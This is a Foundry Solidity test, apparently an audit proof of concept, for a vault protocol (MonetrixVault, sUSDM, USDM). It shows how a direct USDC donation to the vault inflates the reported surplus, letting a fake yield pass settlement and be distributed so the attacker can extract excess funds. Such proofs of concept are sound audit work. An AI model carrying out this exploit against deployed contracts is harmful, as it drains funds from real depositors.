// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/USDM.sol";

contract AuditAgentPoC is SimulatorBase {
    // ATTACK TIMELINE:
    // 1. [Setup] SimulatorBase deploys contracts. Attacker acquires USDM and deposits into sUSDM to hold shares.
    // 2. [T=1] Attacker transfers a large amount of USDC directly to the Vault (transient donation/flash loan).
    // 3. [T=2] totalBackingSigned() reads usdc.balanceOf(vault), inflating surplus() and distributableSurplus().
    // 4. [T=3] Operator calls vault.settle() with a proposedYield that exceeds actual surplus but passes Gate 3 due to inflated balance.
    // 5. [T=4] Operator calls vault.distributeYield(), injecting the fake yield into sUSDM.
    // 6. [Assert] sUSDM totalAssets is artificially inflated, proving attacker can extract more USDC than entitled upon redemption.

    function setUp() public virtual override {
        super.setUp();
        // Advance time to ensure contracts are fully initialized and past any genesis block checks
        vm.warp(1 days);
    }

    function test_exploit() public {
        address attacker = makeAddr("attacker");
        sUSDM susdm = sUSDM(vault.susdm());

        uint256 initialDeposit = 100_000e6;
        uint256 donation = 1_000_000e6;
        uint256 fakeYield = 500_000e6;

        // 1. Setup: Attacker gets USDM and deposits into sUSDM
        deal(address(usdm), attacker, initialDeposit);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), initialDeposit);
        susdm.deposit(initialDeposit, attacker);
        vm.stopPrank();

        uint256 susdmAssetsBefore = susdm.totalAssets();
        int256 surplusBefore = accountant.distributableSurplus();

        // 2. Attacker donates USDC directly to the vault
        deal(address(usdc), attacker, donation);
        vm.prank(attacker);
        usdc.transfer(address(vault), donation);

        // 3. Verify surplus is inflated
        int256 surplusAfter = accountant.distributableSurplus();
        assertGt(surplusAfter, surplusBefore, "Surplus should be inflated by transient USDC donation");

        // 4. Operator settles with a huge proposed yield that exceeds actual surplus but passes due to inflated balance
        vm.prank(operator);
        vault.settle(fakeYield);

        // 5. Operator distributes yield
        vm.prank(operator);
        vault.distributeYield();

        // 6. Assert sUSDM totalAssets increased significantly due to fake yield injection
        uint256 susdmAssetsAfter = susdm.totalAssets();
        assertGt(susdmAssetsAfter, susdmAssetsBefore + 100_000e6, "sUSDM totalAssets inflated by fake yield, enabling extraction");
    }
}
